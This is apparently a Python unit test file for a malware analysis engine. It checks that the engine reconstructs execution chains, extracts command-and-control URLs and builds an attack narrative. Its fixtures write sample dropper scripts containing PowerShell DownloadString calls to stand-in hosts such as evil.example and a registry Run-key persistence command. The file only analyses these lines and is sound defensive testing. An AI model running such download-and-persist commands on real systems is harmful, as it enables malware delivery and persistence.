import tempfile
import unittest
from pathlib import Path

from app.modules.deep_analysis.engine import run_deep_exclusive
from app.modules.deep_analysis.narrative import build_deep_narrative, build_attack_chain
from app.modules.deep_analysis.script_deep import analyze_script_deep


class TestDeepAnalysis(unittest.TestCase):
    def test_script_deep_finds_execution_chain(self):
        with tempfile.NamedTemporaryFile('w', suffix='.cmd', delete=False) as f:
            f.write('@echo off\npowershell -EncodedCommand DownloadString http://evil.example/a\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')
            path = Path(f.name)
        try:
            result = analyze_script_deep(path, filename='dropper.cmd')
            self.assertGreaterEqual(result['likely_stages'], 2)
            self.assertTrue(result['commands_reconstructed'])
            self.assertIn('http://evil.example/a', result['c2_urls'])
        finally:
            path.unlink(missing_ok=True)

    def test_deep_delta_vs_static(self):
        with tempfile.NamedTemporaryFile('w', suffix='.cmd', delete=False) as f:
            f.write('powershell DownloadString http://new-only.example/x')
            path = Path(f.name)
        try:
            static = {'extracted_indicators': {'urls': ['http://old.example/a'], 'domains': []}}
            deep = run_deep_exclusive(path, filename='x.cmd', static=static)
            self.assertGreater(deep['delta']['exclusive_count'], 0)
            bundle = {'deep_exclusive': deep, 'combined_verdict': 'suspicious', 'yara': {}, 'sandbox_lite': {}, 'file_intel': {}, 'ioc_reputation': {}, 'family_hints': {}}
            narrative = build_deep_narrative(bundle)
            self.assertTrue(narrative['summary_bullets'])
            chain = build_attack_chain(bundle)
            self.assertTrue(chain)
        finally:
            path.unlink(missing_ok=True)


if __name__ == '__main__':
    unittest.main()
